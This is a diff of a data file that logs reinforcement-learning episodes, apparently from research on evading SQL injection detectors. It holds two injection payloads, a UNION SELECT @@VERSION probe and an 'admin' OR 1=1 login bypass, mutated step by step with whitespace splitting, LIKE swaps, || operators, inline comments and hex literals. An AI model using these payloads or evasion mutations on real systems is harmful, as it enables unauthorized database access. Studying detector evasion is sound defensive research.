@@ -1,3040 +1,1598 @@
 ;episode;step;original_payload;state;action;next_state;reward;win
-0;1;1;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";3;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";0.7794871651914701;0
-1;1;2;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";10;"""
- select
- *
- from
- users
- where
- id
- =
- '1'
- or
- $+<$
- union
- select
- 1,@@VERSION
- --
- 1'""";1.1999999515712279;0
-2;1;3;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
- select
- *
- from
- users
- where
- id
- =
- '1'
- or
- $+<$
- union
- select
- 1,@@VERSION
- --
- 1'""";25;"""
- select
- *
- from
- users
- where
- id
- =
- '1'
- or
- $+<$
- union
- select
- 1,@@VERSION
- --
- 1'""";1.099999951571228;0
-3;1;4;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
- select
- *
- from
- users
- where
- id
- =
- '1'
- or
- $+<$
- union
- select
- 1,@@VERSION
- --
- 1'""";9;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	 =
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";1.5434782966999574;0
-4;1;5;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	 =
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	 =
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";1.4434782966999573;0
-5;1;6;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	 =
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";2;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";1.2076923478196369;0
-6;1;7;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";18;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";1.1076923478196368;0
-7;1;8;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 1,@@VERSION
-	 --
-	 1'""";8;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.7999999217689079;0
-8;1;9;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";19;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.6999999217689079;0
-9;1;10;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";11;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.35454540186184713;0
-10;1;11;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.25454540186184715;0
-11;1;12;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";11;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.7909090704169157;0
-12;1;13;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";22;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.6909090704169156;0
-13;1;14;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";2;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.5909090704169158;0
-14;1;15;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";19;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.49090907041691567;0
-15;1;16;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.3909090704169158;0
-16;1;17;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";22;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.2909090704169157;0
-17;1;18;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";4;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.19090907041691563;0
-18;1;19;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";21;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.09090907041691576;0
-19;1;20;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";4;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-20;1;21;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";15;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-21;1;22;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";22;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-22;1;23;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-23;1;24;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-24;1;25;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";2;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-25;1;26;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";21;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-26;1;27;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";16;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-27;1;28;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";21;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-28;1;29;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";17;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-29;1;30;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";11;"""
-	 select
-	 *
-	 from
-	 users
-	 where
-	 id
-	  LIKE 
-	 '1'
-	 or
-	 $+<$
-	 union
-	 select
-	 (SELECT 1),@@VERSION
-	 --
-	 1'""";0.0;0
-30;2;1;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";21;"""admin""""or 1 = 1 or """""""" = """"""";2.3999999284744287;0
-31;2;2;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";17;"""admin""""or 1 = 1 or """""""" = """"""";2.2999999284744286;0
-32;2;3;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";14;"""admin""""or#A3H45Ua
-1#A3H45Ua
-=#A3H45Ua
-1#A3H45Ua
-or#A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";8.400000032037498;0
-33;2;4;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or#A3H45Ua
-1#A3H45Ua
-=#A3H45Ua
-1#A3H45Ua
-or#A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";8;"""admin""""or#A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
-or#A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.6714284196191986;0
-34;2;5;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or#A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
-or#A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";6;"""admin"""" || #A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
- || #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.2999999798834327;0
-35;2;6;"""admin""""or 1 = 1 or """""""" = """"""";"""admin"""" || #A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
- || #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";25;"""admin"""" || #A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
- || #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.1999999798834327;0
-36;2;7;"""admin""""or 1 = 1 or """""""" = """"""";"""admin"""" || #A3H45Ua
-(SELECT 1)#A3H45Ua
-=#A3H45Ua
-(SELECT 1)#A3H45Ua
- || #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";9;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";3.1999999716877943;0
-37;2;8;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";21;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";3.099999971687794;0
-38;2;9;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";1;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.999999971687794;0
-39;2;10;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";1;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.8999999716877944;0
-40;2;11;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";5;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.7999999716877944;0
-41;2;12;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";22;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.6999999716877943;0
-42;2;13;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";12;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2.492307658449433;0
-43;2;14;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
-=#A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
-=#A3H45Ua
-""""""";2;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";1.1761903953660398;0
-44;2;15;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";20;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";1.0761903953660397;0
-45;2;16;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";3;"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";0.9761903953660398;0
-46;2;17;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
-(SELECT	 1)#A3H45Ua
- LIKE #A3H45Ua
-(SELECT	 1)#A3H45Ua
-	 ||	 #A3H45Ua
-""""""""#A3H45Ua
- LIKE #A3H45Ua
-""""""";24;"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";0.39999997019767797;0
-47;2;18;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";25;"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";0.2999999701976779;0
-48;2;19;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";25;"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";0.199999970197678;0
-49;2;20;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-(SELECT	 1) OR 0#A3H45Ua
-	 ||	  OR 0#A3H45Ua
-"""""""" OR 0#A3H45Ua
- LIKE  OR 0#A3H45Ua
-""""""";0;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";0.0;0
-50;2;21;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";23;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";0.0;0
-51;2;22;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";17;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";0.0;0
-52;2;23;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-(SELECT	/**/1)/**/OR/**/0#A3H45Ua
-	/**/||	/**//**/OR/**/0#A3H45Ua
-""""""""/**/OR/**/0#A3H45Ua
-/**/LIKE/**//**/OR/**/0#A3H45Ua
-""""""";7;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";0.06666661037339239;0
-53;2;24;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";18;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";0.0;0
-54;2;25;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";9;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";0.0;0
